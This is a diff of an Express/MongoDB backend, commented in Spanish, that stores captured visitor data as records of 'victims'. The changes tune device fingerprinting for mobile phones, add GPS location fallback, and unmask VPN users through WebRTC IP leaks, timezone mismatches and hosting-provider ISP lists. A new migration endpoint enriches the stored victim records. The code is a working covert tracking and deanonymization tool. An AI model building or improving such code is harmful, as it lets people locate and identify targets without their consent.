@@ -93,43 +93,35 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Generar fingerprint mejorado con más datos únicos
+// Generar fingerprint ENFOCADO EN DATOS MÓVILES (alta tasa de éxito)
 function generateFingerprint(data, ip, userAgent) {
+  // Priorizar datos que SIEMPRE están disponibles en móviles
   const components = [
-    // Datos básicos
-    data.fingerprint || '',
-    data.username || '',
-    data.email || '',
-    ip || '',
+    // ✅ SIEMPRE disponible
     userAgent || '',
+    ip || '',
 
-    // Screen
+    // ✅ MUY ALTA probabilidad (>95%)
     data.screen?.resolution || '',
-    data.screen?.colorDepth || '',
-    data.screen?.pixelRatio || '',
+    data.screen?.colorDepth || '24',
+    data.browser?.language || 'en',
+    data.timezoneInfo?.timezone || Intl?.DateTimeFormat().resolvedOptions().timeZone || '',
 
-    // Browser y sistema
-    data.timezoneInfo?.timezone || data.timezone || '',
-    data.browser?.language || data.language || '',
+    // ✅ ALTA probabilidad en móviles (>80%)
     data.device?.platform || '',
-    data.device?.cpuCores || '',
-    data.device?.memory || '',
+    data.device?.vendor || '',
+    data.device?.maxTouchPoints || '0',
 
-    // Fingerprints avanzados
+    // ✅ MEDIA probabilidad (>60%)
     data.fingerprints?.canvas || '',
     data.fingerprints?.webglRenderer || '',
-    data.fingerprints?.audio?.hash || '',
 
-    // Fonts (convertir array a string)
-    (data.fingerprints?.fonts || []).join(','),
+    // ✅ Opcional pero útil si está disponible
+    data.device?.cpuCores || '',
+    data.device?.memory || '',
+    (data.fingerprints?.fonts || []).slice(0, 5).join(','), // Solo primeras 5 fonts
 
-    // WebRTC
-    data.webRTC?.localIP || '',
-
-    // Hardware
-    JSON.stringify(data.hardware || {}),
-
-    // Timestamp para garantizar unicidad
+    // ✅ Timestamp para garantizar unicidad
     Date.now().toString()
   ].join('|');
 
@@ -410,40 +402,71 @@ app.post('/api/capture', async (req, res) => {
     // Primero intentar con IP
     let geo = await getLocationFromIP(clientIP);
 
-    // ✅ DETECCIÓN DE VPN/PROXY
+    // ✅ DETECCIÓN DE VPN/PROXY MEJORADA
     const vpnDetection = {
       timezoneMismatch: false,
       webRTCLeak: false,
       suspiciousISP: false,
-      likelyVPN: false
+      likelyVPN: false,
+      confidence: 'low' // low, medium, high
     };
 
-    // Verificar mismatch entre timezone del navegador y ubicación de IP
-    if (data.timezoneInfo?.timezone && geo.timezone && geo.timezone !== 'Unknown') {
+    // 1. Verificar mismatch entre timezone del navegador y ubicación de IP
+    if (data.timezoneInfo?.timezone && geo.timezone && geo.timezone !== 'Unknown' && geo.timezone !== 'UTC') {
       const browserTZ = data.timezoneInfo.timezone;
       const ipTZ = geo.timezone;
 
-      if (browserTZ !== ipTZ) {
+      // Comparar solo si ambos están disponibles y no son default
+      if (browserTZ && ipTZ && browserTZ !== ipTZ && browserTZ !== 'UTC') {
         vpnDetection.timezoneMismatch = true;
+        vpnDetection.confidence = 'high';
         console.log(`⚠️ Timezone mismatch detectado: Browser=${browserTZ}, IP=${ipTZ}`);
       }
     }
 
-    // Verificar WebRTC leak (IP pública diferente a la IP del request)
-    if (data.webRTC?.publicIP && data.webRTC.publicIP !== 'Unknown' && data.webRTC.publicIP !== clientIP) {
+    // 2. Verificar WebRTC leak (IP pública diferente a la IP del request)
+    if (data.webRTC?.publicIP &&
+        data.webRTC.publicIP !== 'Unknown' &&
+        data.webRTC.publicIP !== 'Error' &&
+        data.webRTC.publicIP !== clientIP &&
+        !data.webRTC.publicIP.startsWith('192.168') &&
+        !data.webRTC.publicIP.startsWith('10.')) {
+
       vpnDetection.webRTCLeak = true;
+      vpnDetection.confidence = 'high';
       console.log(`⚠️ WebRTC leak detectado: WebRTC IP=${data.webRTC.publicIP}, Request IP=${clientIP}`);
     }
 
-    // ISPs conocidos de VPN
-    const vpnISPs = ['digitalocean', 'amazon', 'google cloud', 'azure', 'linode', 'vultr', 'ovh', 'hetzner'];
-    if (geo.isp && vpnISPs.some(vpn => geo.isp.toLowerCase().includes(vpn))) {
-      vpnDetection.suspiciousISP = true;
-      console.log(`⚠️ ISP sospechoso de VPN: ${geo.isp}`);
+    // 3. ISPs conocidos de VPN/Hosting
+    const vpnISPs = [
+      'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
+      'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
+      'hosting', 'cloudflare', 'akamai'
+    ];
+
+    if (geo.isp && typeof geo.isp === 'string') {
+      const ispLower = geo.isp.toLowerCase();
+      if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
+        vpnDetection.suspiciousISP = true;
+        if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
+        console.log(`⚠️ ISP sospechoso de VPN: ${geo.isp}`);
+      }
     }
 
-    // Determinar si probablemente es VPN
-    vpnDetection.likelyVPN = vpnDetection.timezoneMismatch || vpnDetection.suspiciousISP;
+    // 4. Determinar si probablemente es VPN
+    // Alta confianza: WebRTC leak + timezone mismatch
+    // Media confianza: Uno de los dos anteriores
+    // Baja confianza: Solo ISP sospechoso
+    if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
+      vpnDetection.likelyVPN = true;
+      vpnDetection.confidence = 'high';
+    } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
+      vpnDetection.likelyVPN = true;
+      vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
+    } else if (vpnDetection.suspiciousISP) {
+      vpnDetection.likelyVPN = true;
+      vpnDetection.confidence = 'low';
+    }
 
     // Si la API de IP falló o retornó Unknown Y tenemos coordenadas GPS del usuario
     if ((geo.source === 'failed' || geo.city === 'Unknown') &&
@@ -614,16 +637,167 @@ app.delete('/api/clear', async (req, res) => {
   try {
     const result = await victimsCollection.deleteMany({});
     console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} víctimas eliminadas`);
-    res.json({ 
-      success: true, 
+    res.json({
+      success: true,
       message: `${result.deletedCount} victims cleared`,
       deletedCount: result.deletedCount
     });
   } catch (error) {
     console.error('Error en /api/clear:', error);
-    res.status(500).json({ 
-      success: false, 
-      error: 'Internal server error' 
+    res.status(500).json({
+      success: false,
+      error: 'Internal server error'
+    });
+  }
+});
+
+// ✅ MIGRAR/ACTUALIZAR REGISTROS ANTIGUOS
+app.post('/api/migrate', async (req, res) => {
+  try {
+    console.log('🔄 Iniciando migración de datos...');
+
+    const allVictims = await victimsCollection.find({}).toArray();
+    let updated = 0;
+    let errors = 0;
+
+    for (const victim of allVictims) {
+      try {
+        const updates = {};
+        let needsUpdate = false;
+
+        // 1. Asegurar que device.type existe
+        if (!victim.device?.type) {
+          const ua = victim.browser?.userAgent || '';
+          const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua);
+          const isTablet = /tablet|ipad|playbook|silk/i.test(ua);
+
+          updates['device.type'] = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
+          updates['device.isMobile'] = isMobile;
+          updates['device.isTablet'] = isTablet;
+          updates['device.isDesktop'] = !isMobile && !isTablet;
+          needsUpdate = true;
+        }
+
+        // 2. Detectar bots si no existe
+        if (victim.device?.isBot === undefined) {
+          const ua = victim.browser?.userAgent || '';
+          const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
+          updates['device.isBot'] = botPatterns.test(ua);
+          needsUpdate = true;
+        }
+
+        // 3. Re-evaluar VPN detection si está desactualizado o mal configurado
+        if (!victim.network?.vpnDetection || !victim.network.vpnDetection.confidence) {
+          const vpnDetection = {
+            timezoneMismatch: false,
+            webRTCLeak: false,
+            suspiciousISP: false,
+            likelyVPN: false,
+            confidence: 'low'
+          };
+
+          // Timezone mismatch
+          if (victim.timezoneInfo?.timezone && victim.network?.timezone &&
+              victim.network.timezone !== 'Unknown' && victim.network.timezone !== 'UTC') {
+            if (victim.timezoneInfo.timezone !== victim.network.timezone &&
+                victim.timezoneInfo.timezone !== 'UTC') {
+              vpnDetection.timezoneMismatch = true;
+              vpnDetection.confidence = 'high';
+            }
+          }
+
+          // WebRTC leak
+          const clientIP = victim.network?.ip;
+          if (victim.webRTC?.publicIP &&
+              victim.webRTC.publicIP !== 'Unknown' &&
+              victim.webRTC.publicIP !== 'Error' &&
+              victim.webRTC.publicIP !== clientIP &&
+              !victim.webRTC.publicIP.startsWith('192.168') &&
+              !victim.webRTC.publicIP.startsWith('10.')) {
+            vpnDetection.webRTCLeak = true;
+            vpnDetection.confidence = 'high';
+          }
+
+          // ISP sospechoso
+          const vpnISPs = [
+            'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
+            'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
+            'hosting', 'cloudflare', 'akamai'
+          ];
+
+          if (victim.network?.isp && typeof victim.network.isp === 'string') {
+            const ispLower = victim.network.isp.toLowerCase();
+            if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
+              vpnDetection.suspiciousISP = true;
+              if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
+            }
+          }
+
+          // Determinar likelyVPN
+          if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
+            vpnDetection.likelyVPN = true;
+            vpnDetection.confidence = 'high';
+          } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
+            vpnDetection.likelyVPN = true;
+            vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
+          } else if (vpnDetection.suspiciousISP) {
+            vpnDetection.likelyVPN = true;
+            vpnDetection.confidence = 'low';
+          }
+
+          updates['network.vpnDetection'] = vpnDetection;
+          needsUpdate = true;
+        }
+
+        // 4. Agregar behavior.touches y swipes si no existen
+        if (victim.behavior && !victim.behavior.touches) {
+          updates['behavior.touches'] = 0;
+          updates['behavior.swipes'] = 0;
+          needsUpdate = true;
+        }
+
+        // 5. Agregar locationSource si no existe
+        if (victim.network && !victim.network.locationSource) {
+          if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
+            updates['network.locationSource'] = 'gps';
+          } else {
+            updates['network.locationSource'] = 'ipapi';
+          }
+          needsUpdate = true;
+        }
+
+        // Aplicar actualizaciones si hay cambios
+        if (needsUpdate) {
+          await victimsCollection.updateOne(
+            { _id: victim._id },
+            { $set: updates }
+          );
+          updated++;
+        }
+
+      } catch (error) {
+        console.error(`Error migrando victim ${victim._id}:`, error);
+        errors++;
+      }
+    }
+
+    console.log(`✅ Migración completada: ${updated} registros actualizados, ${errors} errores`);
+
+    res.json({
+      success: true,
+      message: 'Migration completed',
+      totalRecords: allVictims.length,
+      updated: updated,
+      errors: errors,
+      unchanged: allVictims.length - updated - errors
+    });
+
+  } catch (error) {
+    console.error('Error en /api/migrate:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Migration failed',
+      details: error.message
     });
   }
 });
